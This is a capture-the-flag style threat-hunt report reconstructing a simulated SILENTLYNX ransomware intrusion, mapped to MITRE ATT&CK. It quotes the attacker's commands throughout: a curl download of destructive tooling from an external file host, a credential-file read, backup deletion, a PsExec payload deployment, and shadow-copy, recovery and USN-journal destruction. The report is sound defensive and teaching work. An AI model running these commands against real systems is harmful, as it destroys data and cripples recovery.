# 📚 Table of Contents

- [🕵️‍♀️ Threat Hunt Overview](#threat-hunt-overview)
- [🧰 Platforms and Tools](#-platforms-and-tools)
- [🎯 Background, Objective and Scope](#-Background-Objective-and-Scope)
- [🧠 Executive Summary](#-Executive-Summary)
- [🔍 Summary of Findings (Flags)](#-Summary-of-Findings)
- 🧩 Key Findings by Flag (With KQL + MITRE)
  - [PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)](#-Flag-1:-SSH-Pivot-to-Backup-Server)
  - [PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)](#-Flag-13:-Remote-Execution)
  - [PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)](#-Flag-16:-Shadow-Copy-Service-Stopped)
  - [PHASE 4: PERSISTENCE (FLAGS 23-24)](#-Flag-23:-EXECUTION-Registry-Autorun)
  - [PHASE 5: ANTI-FORENSICS (FLAG 25)](#-Flag-25:-Journal-Deletion)
  - [PHASE 6: RANSOMWARE SUCCESS (FLAG 26)](#-Flag-26:-EXECUTION-Registry-Autorun)
- [🎯 MITRE ATT&CK Technique Mapping](#-MITRE-ATT&CK-Technique-Mapping)
- [💠 Diamond Model of Intrusion Analysis](#-Diamond-Model-of-Intrusion-Analysis)
- [🧾 Conclusion](#-Conclusion)
- [🎓 Lessons Learned](#-Lessons-Learned)
- [🛠️ Recommendations for Remediation](#-Recommendations-for-Remediation)

---

# 🕵️‍♀️ Threat Hunt: “Dead in the Water - Ransomware Before the Ransom”

***“By the time encryption begins, the outcome is already decided. The real battle happens earlier — in silence, between backups and recovery.”***

This threat hunt examines a deliberate, multi-phase ransomware intrusion designed to render an organization unrecoverable before the ransom note ever appears. Rather than relying on noisy malware or rapid encryption, the adversary methodically dismantled recovery mechanisms, abused legitimate credentials, and leveraged native administrative tools to move laterally and prepare the environment for maximum impact.

The scenario unfolds across both Windows and Linux systems, reflecting the realities of modern hybrid enterprise environments. Initial access enabled east–west movement into a Linux backup server, where backups were enumerated, credentials harvested, and recovery data permanently destroyed. Only after recovery paths were eliminated did the attacker pivot back into the Windows environment to deploy the SILENTLYNX ransomware payload, inhibit system recovery, and establish persistence.

This intrusion demonstrates how ransomware operations increasingly resemble stealthy intrusion campaigns, with an emphasis on living-off-the-land techniques, recovery suppression, and cross-platform coordination — often evading traditional alerting until irreversible damage has occurred.

This report includes:

- 📅 A phase by phase reconstruction of the attack lifecycle, from lateral movement to encryption

- 🧭 MITRE ATT&CK mappings covering discovery, credential abuse, recovery inhibition, persistence, and impact

- 💠 A Diamond Model of Intrusion Analysis to profile adversary intent and capability

- 🔍 Evidence backed explanations for all 26 flags uncovered during the hunt

- 🛠️ Actionable lessons learned and remediation recommendations to prevent similar attacks

Dead in the Water reinforces a critical truth for defenders: ransomware is not an endpoint problem — it is a recovery problem. Detecting and disrupting the quiet steps that precede encryption is the difference between resilience and total operational loss.

---

## 🧰 Platforms and Tools

**Telemetry / Hunting Platform**
- Microsoft Defender for Endpoint (Advanced Hunting)

**Primary Tables Used**
- DeviceProcessEvents
- DeviceLogonEvents
- DeviceRegistryEvents
- DeviceFileEvents

**Analysis Method**
- Process + logon correlation (source → target)
- Command-line pivoting for LOLBins
- Persistence hunting (Registry Run Keys, Scheduled Tasks)
- Impact and anti-forensics verification

---

## 🎯 Background, Objective and Scope

**Background**
The “Dead in the Water” scenario simulates a ransomware operator already inside an environment. The attacker progresses through backup compromise, recovery neutralization, lateral movement, ransomware execution, persistence, and anti-forensics.

**Objective**
Reconstruct the attacker’s behavior end-to-end, identify the commands/tools used at each stage, map actions to MITRE ATT&CK, and produce a report suitable for a SOC / client-facing incident summary.

**Scope**
***Systems involved (observed)***
- Windows workstation: adminpc / azuki-adminpc (source of remote execution)
- Linux backup server: azuki-backupsrv... (target of SSH pivot + backup destruction)

***Key attacker account observed***
- yuki.tanaka (Windows)
- backup-admin (Linux backup server)

---

## 🧠 Executive Summary

The attacker executed a ransomware playbook prioritizing ***recovery denial:***

1. Pivoted into backup infrastructure via SSH using a valid backup admin account ***(backup-admin@10.1.0.189)***.

2. Performed backup discovery (directories, archives, users, cron jobs) and accessed plaintext stored credentials in backup configs.

3. Transitioned to impact by deleting backups ***(rm -rf /backups/...)*** and disabling cron services ***(systemctl stop/disable cron)*** to prevent future backup creation.

4. Began Windows ransomware deployment using PsExec for remote execution.

5. Performed recovery inhibition and anti-forensics such as shadow copy manipulation, Windows recovery disablement (bcdedit), catalog deletion (wbadmin), and USN journal deletion (fsutil).

6. Established persistence using Registry Run keys and Scheduled Tasks masquerading as legitimate Windows security components.

7. Dropped ransom notes: ***SILENTLYNX_README.txt***.

---

## 🔍 Summary of Findings (Flags)

- ✅ Completed in this report: Flags 1–26

| Flag  | Phase              | Category            | Finding                                                           |
| ----- | ------------------ | ------------------- | ----------------------------------------------------------------- |
| 1     | Backup Compromise  | Lateral Movement    | `ssh.exe backup-admin@10.1.0.189`                                 |
| 2     | Backup Compromise  | Lateral Movement    | Source IP: `10.1.0.108`                                           |
| 3     | Backup Compromise  | Credential Abuse    | Account: `backup-admin`                                           |
| 4     | Backup Compromise  | Discovery           | `ls --color=auto -lh /backups/`                                   |
| 5     | Backup Compromise  | Discovery           | `find /backups -name *.tar.gz`                                    |
| 6     | Backup Compromise  | Discovery           | `cat /etc/passwd`                                                 |
| 7     | Backup Compromise  | Discovery           | `cat /etc/crontab`                                                |
| 8     | Backup Compromise  | Tool Transfer       | `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`       |
| 9     | Backup Compromise  | Credential Access   | `cat /backups/configs/all-credentials.txt`                        |
| 10    | Backup Compromise  | Destruction         | `rm -rf /backups/...`                                             |
| 11    | Backup Compromise  | Service Stop        | `systemctl stop cron`                                             |
| 12    | Backup Compromise  | Service Disabled    | `systemctl disable cron`                                          |
| 13    | Windows Deployment | Remote Execution    | `psexec64.exe`                                                    |
| 14    | Windows Deployment | Deployment Command  | -u kenji.sato -p ***** -c -f C:\Windows\Temp\cache\silentlynx.exe |
| 15    | Windows Deployment | Payload             | silentlynx.exe                                                    |
| 16    | Recovery Inhibition| silentlynx.exe      | net stop VSS /y                                                   |
| 17    | Recovery Inhibition| Bckup Engine Stopped| net stop wbengine /y                                              |
| 18    | Recovery Inhibition| Process Termination | taskkill /F /IM <process>.exe (ex: sqlservr.exe)                  |
| 19    | Recovery Inhibition| Shadw Copies Deleted| vssadmin delete shadows /all /quiet                               |
| 20    | Impact             | Recovery Inhibition | `vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB` |
| 21    | Impact             | Recovery Disabled   | `bcdedit /set {default} recoveryenabled No`                       |
| 22    | Impact             | Catalog Deleted     | `"wbadmin" delete catalog -quiet`                                 |
| 23    | Persistence        | Registry Run Key    | `WindowsSecurityHealth`                                           |
| 24    | Persistence        | Scheduled Task      | `Microsoft\Windows\Security\SecurityHealthService`                |
| 25    | Anti-Forensics     | Journal Deletion    | `fsutil.exe usn deletejournal /D C:`                              |
| 26    | Ransomware Success | Ransom Note         | `SILENTLYNX_README.txt`                                           |

---

### 🏁 Flag 1: SSH Pivot to Backup Server

**MITRE:**
T1021.004 — Remote Services: SSH

**Question:**
What remote access command was executed from the compromised workstation?

**Answer**  
ssh.exe backup-admin@10.1.0.189

**Evidence:**

<img width="561" height="155" alt="image" src="https://github.com/user-attachments/assets/16e12311-2ba3-49bf-820b-d360e02035e2" />
<img width="757" height="158" alt="image" src="https://github.com/user-attachments/assets/aa40c955-8ac4-4e8d-87b7-7ed3482668cf" />

**Why This Matters:**
This confirms the attacker moved laterally into backup infrastructure early—consistent with modern ransomware operators who prioritize recovery denial.

---

### 🏁 Flag 2: Source IP for SSH Connection

**MITRE:**
T1021.004 — Remote Services: SSH

**Question:**
What IP address initiated the connection to the backup server?

**Answer**  
10.1.0.108

**Evidence:**

<img width="527" height="91" alt="image" src="https://github.com/user-attachments/assets/042edd0b-9520-4c8e-97dd-d4c7b64172e6" />
<img width="562" height="150" alt="image" src="https://github.com/user-attachments/assets/b8dbacd9-3fdb-4f1a-bb73-d9b4844a1d71" />


**Why This Matters:**
Reveals the internal source of lateral movement (east–west traffic), helping scope which host likely served as the pivot point.

---

### 🏁 Flag 3: Account Used to Access Backup Server

**MITRE:**
T1078.002 — Valid Accounts: Domain Accounts

**Question:**
What account was used to access the backup server?

**Answer**  
backup-admin

**Evidence:**

<img width="529" height="80" alt="image" src="https://github.com/user-attachments/assets/aabacb30-9933-45ea-84e0-9da93a10ffcd" />
<img width="710" height="145" alt="image" src="https://github.com/user-attachments/assets/fca25bf1-b123-496f-bd06-c3a214d487d7" />

**Why This Matters:**
Shows credential compromise/abuse (not exploitation). Backup admin access is a high-impact privilege enabling backup discovery + destruction.

---

### 🏁 Flag 4: Backup Directory Enumeration

**MITRE:**
T1083 — File and Directory Discovery

**Question:**
What command listed the backup directory contents?

**Answer**  
ls --color=auto -la /backups/

**Evidence:**

<img width="720" height="166" alt="image" src="https://github.com/user-attachments/assets/2ea267ff-9fa5-4763-b13b-3e8e4cbf411d" />
<img width="990" height="202" alt="image" src="https://github.com/user-attachments/assets/00e14966-9420-4235-b77d-ad90f10664de" />

**Why This Matters:**
Confirms structured reconnaissance of recovery assets.

---

### 🏁 Flag 5: Search for Backup Archives

**MITRE:**
T1083 — File and Directory Discovery

**Question:**
What command searched for backup archives?

**Answer**  
find /backups -name *.tar.gz

**Evidence:**

<img width="885" height="158" alt="image" src="https://github.com/user-attachments/assets/fd5cbd99-cf49-4fb0-a1f4-505bbe3be0a6" />
<img width="1307" height="118" alt="image" src="https://github.com/user-attachments/assets/3c2ba38d-a99f-4fd1-bb90-bc7b471f952e" />

**Why This Matters:**
Shows the attacker identifying what recovery formats exist before destruction.

---

### 🏁 Flag 6: Local Account Enumeration

**MITRE:**
T1087.001 — Account Discovery: Local Account

**Question:**
What command enumerated local accounts?

**Answer**  
cat /etc/passwd

**Evidence:**

<img width="765" height="133" alt="image" src="https://github.com/user-attachments/assets/eba9ef1c-c44c-4b23-bfed-7be5a266953d" />
<img width="569" height="181" alt="image" src="https://github.com/user-attachments/assets/cd056205-43b7-441a-83d0-5241dab6cb9d" />

---

### 🏁 Flag 7: Scheduled Job Reconnaissance

**MITRE:**
T1083 — File and Directory Discovery

**Question:**
What command revealed scheduled jobs on the system?

**Answer**  
cat /etc/crontab

**Evidence:**

<img width="693" height="145" alt="image" src="https://github.com/user-attachments/assets/9987899f-6160-4f20-8c88-a9517cf6ca46" />
<img width="644" height="113" alt="image" src="https://github.com/user-attachments/assets/7cb1503d-7169-4a38-ac58-05422aba827d" />

**Why This Matters:**
Shows the attacker identifying what recovery formats exist before destruction.

---

### 🏁 Flag 8: External Tool Download

**MITRE:**
T1105 — Ingress Tool Transfer

**Question:**
What command downloaded external tools? 

**Answer**  
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z

**Evidence:**

<img width="497" height="97" alt="image" src="https://github.com/user-attachments/assets/8ed74df2-6efd-4dd9-a453-1e69ba8c91bb" />
<img width="786" height="143" alt="image" src="https://github.com/user-attachments/assets/b2ee3e9d-bb79-4ef6-81bf-6c78fbb4858e" />

**Why This Matters:**
Marks the shift from recon → execution tooling. External file-hosting infrastructure is often used for rapid staging.

---

### 🏁 Flag 9: Plaintext Credential Access

**MITRE:**
T1552.001 — Unsecured Credentials: Credentials in Files

**Question:**
What command accessed stored credentials? 

**Answer**  
cat /backups/configs/all-credentials.txt

**Evidence:**

<img width="1085" height="258" alt="image" src="https://github.com/user-attachments/assets/b3a06073-b12b-41df-86e0-e78e4e424318" />
<img width="1148" height="161" alt="image" src="https://github.com/user-attachments/assets/5eedb788-c8eb-4cd0-b8fc-016209632273" />

**Why This Matters:**
Backups became a credential vault, explaining speed + breadth of later lateral movement.

---

### 🏁 Flag 10: Backup Destruction

**MITRE:**
T1485 — Data Destruction

**Question:**
What command destroyed backup files?

**Answer**  
rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations

**Evidence:**

<img width="802" height="127" alt="image" src="https://github.com/user-attachments/assets/c0545943-3f96-4b80-96ff-40d9e8b30315" />
<img width="1717" height="215" alt="image" src="https://github.com/user-attachments/assets/8db1e65f-bced-494a-891d-d87fb84b2080" />

**Why This Matters:**
Backups became a credential vault, explaining speed + breadth of later lateral movement.

---

### 🏁 Flag 11: Backup Service Stopped

**MITRE:**
T1489 — Service Stop

**Question:**
What command stopped the backup service?

**Answer**  
systemctl stop cron

**Evidence:**

<img width="669" height="98" alt="image" src="https://github.com/user-attachments/assets/bc93efd0-f6bf-4b52-8d5a-bdfea68ec0a1" />
<img width="1464" height="77" alt="image" src="https://github.com/user-attachments/assets/08ba85dd-df3b-40c2-bd1e-927b0fbf8b5f" />

---

### 🏁Flag 12: Backup Service Disabled

**MITRE:**
Flag 12: Backup Service Disabled

**Question:**
What command permanently disabled the backup service?

**Answer**  
systemctl disable cron

**Evidence:**

<img width="675" height="103" alt="image" src="https://github.com/user-attachments/assets/80e76493-6f35-47ab-829e-4fd7a5470262" />
<img width="1486" height="117" alt="image" src="https://github.com/user-attachments/assets/b217920b-7ad2-4b25-b55e-e45aa8916495" />

---

### 🏁 Flag 13: Remote Execution

**MITRE:**
T1021.002 — SMB / Windows Admin Shares (Remote Services)

**Question:**
What tool executed commands on remote systems?

**Answer**  
psexec64.exe

**Evidence:**

<img width="941" height="128" alt="image" src="https://github.com/user-attachments/assets/227b765f-e20b-4f20-b10b-0524d196b51a" />
<img width="1360" height="345" alt="image" src="https://github.com/user-attachments/assets/cd32b84d-f9af-4c7f-a4f6-13c85c39c638" />

---

### 🏁 Flag 14: Full Ransomware Deployment Command

**MITRE:**
T1021.002 — Remote Services: SMB / Admin Shares

**Question:**
What is the full deployment command?

**Answer**  
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ***** -c -f C:\Windows\Temp\cache\silentlynx.exe

**Evidence:**

<img width="960" height="125" alt="image" src="https://github.com/user-attachments/assets/6f4b68bd-0174-4a89-994f-d23da3b6c283" />


**Why This Matters:**
This command captures the attacker’s exact hands-on deployment method

---

### 🏁 Flag 15: EXECUTION - Malicious Payload

**MITRE:**
T1204.002 – User Execution: Malicious File

**Question:**
What payload was deployed?

**Answer**  
silentlynx.exe

**Evidence:**

<img width="626" height="144" alt="image" src="https://github.com/user-attachments/assets/ad9a7380-93c2-4c4a-961d-9feda0a532dc" />
<img width="1399" height="260" alt="image" src="https://github.com/user-attachments/assets/9595fbb3-5948-49bc-8f13-d978176d4668" />

**Why This Matters:**
Identifying the deployed payload confirms the exact ransomware binary used in the attack, enabling precise IOC creation and environment wide detection.

---

### 🏁 Flag 16: Shadow Copy Service Stopped

**MITRE:**
T1490 – Inhibit System Recovery

**Question:**
What command stopped the shadow copy service?

**Answer**  
net stop VSS /y

**Evidence:**

<img width="1015" height="186" alt="image" src="https://github.com/user-attachments/assets/ad6c989e-42eb-49e8-b40b-0be2ce744361" />
<img width="579" height="238" alt="image" src="https://github.com/user-attachments/assets/f35f7637-9a24-4d42-8512-1e54c104cfab" />


**Why This Matters:**
Stopping the Volume Shadow Copy Service removes one of the last built-in recovery mechanisms available on Windows systems. This action confirms the attacker had entered the active ransomware execution phase and intentionally prevented file restoration, significantly increasing the likelihood of irreversible data loss.

---

### 🏁 Flag 17: Windows Backup Engine Stopped

**MITRE:**
T1490 – Inhibit System Recovery

**Question:**
What command stopped the backup engine?

**Answer**  
net stop wbengine /y

**Evidence:**

<img width="991" height="129" alt="image" src="https://github.com/user-attachments/assets/27e46487-65df-490c-817c-64df5936b482" />
<img width="1350" height="158" alt="image" src="https://github.com/user-attachments/assets/e5736042-ed42-466b-8c29-3192b21d14c1" />


**Why This Matters:**
This complements the earlier VSS stop and ensures no system state or file backups can run during encryption.

---

### 🏁 Flag 18: Process Termination to Unlock Files
**MITRE:**
T1490 – Inhibit System Recovery

**Question:**
What command terminated processes to unlock files?

**Answer**  
taskkill /F /IM sqlservr.exe

**Evidence:**

<img width="834" height="127" alt="image" src="https://github.com/user-attachments/assets/ebfe219f-8297-4ddc-ac58-6edd93804ee6" />
<img width="1126" height="118" alt="image" src="https://github.com/user-attachments/assets/4e20a8bc-9e41-4ed1-b2dd-f868cc1c45ab" />

**Why This Matters:**
Terminating database and productivity processes releases file locks that would otherwise prevent successful encryption. This behavior demonstrates deliberate preparation for maximum ransomware impact and aligns with defense evasion techniques used to ensure encryption completes without errors or interruptions.

---

### 🏁 Flag 19: Volume Shadow Copies Deleted

**MITRE:**
T1490 – Inhibit System Recovery

**Question:**
What command deleted recovery points?

**Answer**  
vssadmin delete shadows /all /quiet

**Evidence:**

<img width="824" height="102" alt="image" src="https://github.com/user-attachments/assets/64a57182-6fab-491c-b198-052999d7ccff" />
<img width="505" height="194" alt="image" src="https://github.com/user-attachments/assets/fffb60f0-2e4d-41bd-b670-41219f6c64d9" />

**Why This Matters:**
Deleting all volume shadow copies permanently removes built in recovery options, forcing victims to rely on external backups or pay ransom. This action strongly confirms the attack has moved from preparation to irreversible impact.

### 🏁 Flag 20: Recovery Point Deletion

**MITRE:**
T1490 – Inhibit System Recovery

**Question:**
What command limited recovery storage?

**Answer**  
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB

**Evidence:**

<img width="1129" height="133" alt="image" src="https://github.com/user-attachments/assets/4e7ff4fd-97c3-4053-aabe-8b29f5f061cd" />
<img width="1673" height="243" alt="image" src="https://github.com/user-attachments/assets/381c76f2-7e0c-4311-b3b0-ee79c30da936" />

**Why This Matters:**
Deleting all volume shadow copies permanently removes built in recovery options, forcing victims to rely on external backups or pay ransom. This action strongly confirms the attack has moved from preparation to irreversible impact.

---

### 🏁 Flag 21: EXECUTION - Malicious Payload

**MITRE:**
T1490: Inhibit System Recovery

**Question:**
What command disabled system recovery?

**Answer**  
bcdedit /set {default} recoveryenabled No

**Evidence:**

<img width="1014" height="126" alt="image" src="https://github.com/user-attachments/assets/15e9bd1b-5402-4a3a-a10d-6ea692c634d4" />
<img width="1562" height="119" alt="image" src="https://github.com/user-attachments/assets/a37ccfbf-974a-4406-9188-cbcd6c3c9a23" />

**Why This Matters:**
This command prevents Windows from entering recovery mode, eliminating built in repair options after encryption. It confirms the attacker intentionally removed the last native recovery mechanism.

### 🏁 Flag 22: Catalog Deletion

**MITRE:**
T1490 – Inhibit System Recovery

**Question:**
What command deleted the backup catalogue?

**Answer**  
"wbadmin" delete catalog -quiet

**Evidence:**

<img width="1002" height="125" alt="image" src="https://github.com/user-attachments/assets/c93eed37-22b9-4f47-a515-235dd20fb59d" />
<img width="858" height="84" alt="image" src="https://github.com/user-attachments/assets/cf4d8c45-30c0-4e1d-823d-64f816637123" />

**Why This Matters:**
Deleting the Windows backup catalog removes all knowledge of existing backup versions and restore points. Even if backup files remain on disk, the system can no longer enumerate or restore them, effectively severing recovery through native Windows tools.

---

### 🏁 Flag 23: EXECUTION - Registry Autorun

**MITRE:**
T1547.001: Registry Run Keys / Startup Folder

**Question:**
What registry value establishes persistence?

**Answer**  
WindowsSecurityHealth

**Evidence:**

<img width="669" height="89" alt="image" src="https://github.com/user-attachments/assets/15999561-1f93-41a4-9dcb-7b094a56f9a4" />
<img width="1556" height="275" alt="image" src="https://github.com/user-attachments/assets/70414361-d1f0-4831-a172-61728c6a9e0e" />


**Why This Matters:**
This is a textbook T1547.001 – Registry Run Key persistence technique: Living off the land style naming. Tied directly to the ransomware payload I identified earlier.

### 🏁 Flag 24: Scheduled Execution

**MITRE:**
T1053.005: Scheduled Task/Job

**Question:**
What scheduled task was created?

**Answer**  
Microsoft\Windows\Security\SecurityHealthService

**Evidence:**

<img width="1004" height="128" alt="image" src="https://github.com/user-attachments/assets/6ed8e704-6b62-4071-b9d7-fc306dca564c" />
<img width="1524" height="243" alt="image" src="https://github.com/user-attachments/assets/58b359e9-6b94-4f66-bb3d-a2c60791ea81" />

**Why This Matters:**
By creating a scheduled task that masquerades as a legitimate Windows Security component, the attacker established reliable persistence that survives logouts and reboots. This allows the ransomware payload to re-execute with elevated privileges while blending into normal system activity, significantly increasing dwell time and reducing the likelihood of detection during remediation.

### 🏁 Flag 25: Journal Deletion

**MITRE:**
T1070.004: Indicator Removal on Host - File Deletion

**Question:**
What command deleted forensic evidence?

**Answer**  
fsutil.exe usn deletejournal /D C:

**Evidence:**

<img width="998" height="127" alt="image" src="https://github.com/user-attachments/assets/3d3b8b3c-3f8a-40f8-8b72-41ec04768dd0" />
<img width="883" height="187" alt="image" src="https://github.com/user-attachments/assets/6a673178-0bbc-445c-b567-5bd3844e6da9" />


**Why This Matters:**
Deletes the NTFS USN Change Journal, Removes forensic visibility into: File creation, Deletion and Modification timelines. Common ransomware and post exploitation cleanup behavior.

---

### 🏁 Flag 26: EXECUTION - Registry Autorun

**MITRE:**
T1486: Data Encrypted for Impact

**Question:**
What is the ransom note filename?

**Answer**  
SILENTLYNX_README.txt

**Evidence:**

<img width="1019" height="149" alt="image" src="https://github.com/user-attachments/assets/634558a1-2b9e-4cbc-8c73-117d60fda71f" />
<img width="814" height="234" alt="image" src="https://github.com/user-attachments/assets/c77df180-59c5-4292-aab7-2b814424696f" />

**Why This Matters:**
The creation of a ransom note confirms that encryption successfully completed and the attacker reached their final impact objective. Ransom notes are strong indicators of ransomware success and help establish the exact moment the incident transitioned from disruption to extortion. This event also provides a clear incident end state for timeline reconstruction and executive reporting.

---

## 🎯 MITRE ATT&CK Technique Mapping

| Flag | MITRE Technique                             | ID                                                          | Description                                                                                                                            |
| ---- | ------------------------------------------- | ----------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | Remote Services: SSH                        | [T1021.004](https://attack.mitre.org/techniques/T1021/004/) | Remote SSH access executed from the compromised workstation to the backup server (`ssh.exe backup-admin@10.1.0.189`).                  |
| 2    | Remote Services: SSH                        | [T1021.004](https://attack.mitre.org/techniques/T1021/004/) | Source host `10.1.0.108` initiated the SSH connection to the Linux backup server for lateral movement.                                 |
| 3    | Valid Accounts: Domain Accounts             | [T1078.002](https://attack.mitre.org/techniques/T1078/002/) | Abuse of the legitimate account `backup-admin` to access critical backup infrastructure.                                               |
| 4    | File and Directory Discovery                | [T1083](https://attack.mitre.org/techniques/T1083/)         | Backup directory enumeration using `ls --color=auto -la /backups/` to identify recovery data locations.                                |
| 5    | File and Directory Discovery                | [T1083](https://attack.mitre.org/techniques/T1083/)         | Search for backup archives using `find /backups -name *.tar.gz` to locate high-value backup files.                                     |
| 6    | Account Discovery: Local Account            | [T1087.001](https://attack.mitre.org/techniques/T1087/001/) | Enumeration of local Linux accounts via `cat /etc/passwd` to understand valid users on the system.                                     |
| 7    | Scheduled Task/Job Discovery                | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Recon of scheduled jobs by reading `cat /etc/crontab` to learn backup timing and automation.                                           |
| 8    | Ingress Tool Transfer                       | [T1105](https://attack.mitre.org/techniques/T1105/)         | External tool download via `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z` to stage destructive tooling.                   |
| 9    | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Access to stored credentials using `cat /backups/configs/all-credentials.txt` to harvest secrets from the backup server.               |
| 10   | Data Destruction                            | [T1485](https://attack.mitre.org/techniques/T1485/)         | Destructive wipe of backup data using `rm -rf /backups/...` to eliminate recovery options before ransomware impact.                    |
| 11   | Service Stop                                | [T1489](https://attack.mitre.org/techniques/T1489/)         | Stopping the cron service via `systemctl stop cron` to disrupt scheduled backup operations immediately.                                |
| 12   | Service Stop                                | [T1489](https://attack.mitre.org/techniques/T1489/)         | Disabling cron via `systemctl disable cron` to ensure backup scheduling does not resume after reboot.                                  |
| 13   | Remote Services: SMB/Windows Admin Shares   | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | Use of `psexec64.exe` to execute commands remotely across Windows systems for staged ransomware deployment.                            |
| 14   | Remote Services: SMB/Windows Admin Shares   | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | Full remote deployment command (`PsExec64.exe \\10.1.0.102 ... silentlynx.exe`) used to copy and execute the payload on a target host. |
| 15   | User Execution: Malicious File              | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | Execution of the ransomware payload `silentlynx.exe`, enabling hunting for the dropped binary across endpoints.                        |
| 16   | Inhibit System Recovery                     | [T1490](https://attack.mitre.org/techniques/T1490/)         | Stopping Volume Shadow Copy Service via `net stop VSS /y` to prevent recovery during encryption.                                       |
| 17   | Inhibit System Recovery                     | [T1490](https://attack.mitre.org/techniques/T1490/)         | Stopping Windows Backup Engine via `net stop wbengine /y` to block backup creation and restoration.                                    |
| 18   | Impair Defenses: Disable or Modify Tools    | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Forced termination of `sqlservr.exe` using `taskkill /F /IM sqlservr.exe` to unlock files and remove encryption blockers.              |
| 19   | Inhibit System Recovery                     | [T1490](https://attack.mitre.org/techniques/T1490/)         | Deletion of shadow copies via `vssadmin delete shadows /all /quiet` to remove restore points.                                          |
| 20   | Inhibit System Recovery                     | [T1490](https://attack.mitre.org/techniques/T1490/)         | Resizing shadow storage via `vssadmin resize shadowstorage ... /maxsize=401MB` to prevent new recovery points from being created.      |
| 21   | Inhibit System Recovery                     | [T1490](https://attack.mitre.org/techniques/T1490/)         | Disabling Windows recovery with `bcdedit /set {default} recoveryenabled No` to block automated repair options.                         |
| 22   | Inhibit System Recovery                     | [T1490](https://attack.mitre.org/techniques/T1490/)         | Deleting the backup catalog via `wbadmin delete catalog -quiet` to remove backup history and restore references.                       |
| 23   | Registry Run Keys / Startup Folder          | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Persistence established via autorun registry value `WindowsSecurityHealth` to launch attacker-controlled execution at startup.         |
| 24   | Scheduled Task: Scheduled Task              | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Persistence via scheduled task creation at `Microsoft\Windows\Security\SecurityHealthService` to ensure recurring execution.           |
| 25   | Indicator Removal on Host: File Deletion    | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | Anti-forensic deletion of NTFS USN journal using `fsutil.exe usn deletejournal /D C:` to reduce forensic visibility.                   |
| 26   | Data Encrypted for Impact                   | [T1486](https://attack.mitre.org/techniques/T1486/)         | Ransomware success indicated by ransom note `SILENTLYNX_README.txt`, confirming encryption for impact.                                 |

---
# Diamond Model of Intrusion Analysis
+-----------------------------+       +-----------------------------------+
|                             |<----->|                                   |
|          Adversary          |       |          Infrastructure            |
| SILENTLYNX Ransomware Actor |       | Internal: 10.1.0.108, 10.1.0.189   |
| (Opportunistic / Criminal)  |       | External: litter.catbox.moe        |
|                             |       | Tool Hosting: io523y.7z            |
+-----------------------------+       +-----------------------------------+
                ^                                      |
                |                                      v
+-----------------------------+       +-----------------------------------+
|            Victim           |<----->|            Capability              |
| Linux Backup Server         |       | SSH, curl, rm, systemctl           |
| Windows Endpoints           |       | PsExec, PowerShell, net.exe        |
| Accounts: backup-admin,     |       | vssadmin, wbadmin, taskkill        |
| kenji.sato                  |       | Registry Run Keys, Scheduled Tasks |
+-----------------------------+       +-----------------------------------+

---

# 🔍 Breakdown of Each Node

**🕵️ Adversary**

***Name/Attribution:*** 

- SILENTLYNX ransomware operator

Financially motivated criminal actor (hands on keyboard), consistent with modern enterprise ransomware tradecraft.

***Evidence:***

- Deliberate pre-encryption recovery inhibition (backup deletion, VSS removal, catalog destruction).

- Coordinated Linux + Windows attack chain, indicating operator familiarity with hybrid environments.

- Use of native administrative tools (PsExec, vssadmin, wbadmin, systemctl) rather than custom malware loaders.

- Sequential execution aligned with ransomware best practices: destroy backups → inhibit recovery → deploy payload → persist → encrypt.

**🌐 Infrastructure**

***Internal Network Infrastructure:***

- 10.1.0.108 — compromised Windows workstation (attack origin)

- 10.1.0.189 — Linux backup server (primary recovery target)

- 10.1.0.102 — Windows endpoint targeted via PsExec deployment

***External Hosting / Tool Staging:***

- litter.catbox.moe — external file hosting used to stage destructive tooling

- Downloaded archive: destroy.7z

***Execution & Deployment Artifacts:***

- destroy.7z — backup destruction tooling

- silentlynx.exe — ransomware payload

***Persistence Infrastructure:***

- Registry autorun value: WindowsSecurityHealth

- Scheduled task path:

- Microsoft\Windows\Security\SecurityHealthService

**🛠️ Capability**

***Tactics and Tools:***

- SSH for lateral movement into Linux infrastructure

- curl for external tool retrieval

- rm -rf for irreversible backup destruction

- systemctl to stop and disable cron-based backup services

- PsExec64.exe for remote Windows command execution

- net.exe, vssadmin, wbadmin for recovery inhibition

- taskkill to terminate file-locking processes (e.g., SQL Server)

- Registry Run Keys and Scheduled Tasks for persistence

- Filesystem journal deletion to reduce forensic visibility

***Representative Commands:***

ssh.exe backup-admin@10.1.0.189
rm -rf /backups/*
systemctl disable cron

PsExec64.exe \\10.1.0.102 -u kenji.sato -p ***** -c silentlynx.exe
vssadmin delete shadows /all /quiet
fsutil.exe usn deletejournal /D C:

**🎯 Victim**

***Systems Affected:***

- Linux Backup Server — primary target to eliminate recovery options

- Windows Endpoints — ransomware deployment targets

***User Accounts Abused:***

- backup-admin — privileged backup infrastructure access

- kenji.sato — leveraged for remote execution via PsExec

***Targeted Assets:***

- Backup repositories under /backups/

- Volume Shadow Copies and Windows Backup Catalog

- Active databases (SQL Server) to ensure encryption completeness

***Persistence Locations:***

- Windows Registry Run Keys

- Scheduled Tasks under Windows Security namespace

---

# 🧾 Conclusion

